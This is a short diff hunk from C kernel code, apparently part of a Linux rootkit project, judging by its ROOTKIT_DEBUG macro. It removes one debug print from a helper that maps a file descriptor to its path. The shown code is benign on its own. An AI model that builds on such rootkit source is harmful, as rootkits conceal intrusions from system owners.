@@ -75,9 +75,6 @@ get_path(unsigned int fd, char *path, size_t bufsiz)
 	
 	files_path = files_table->fd[fd]->f_path;
 	cwd = d_path(&files_path, buf, 100*sizeof(char));
-
-	ROOTKIT_DEBUG(KERN_INFO "Found fd %d with name %s!\n", fd, cwd);
-
 	path_len = strlen(cwd);
 	
 	/* check whether the supplied buffer is big enough */
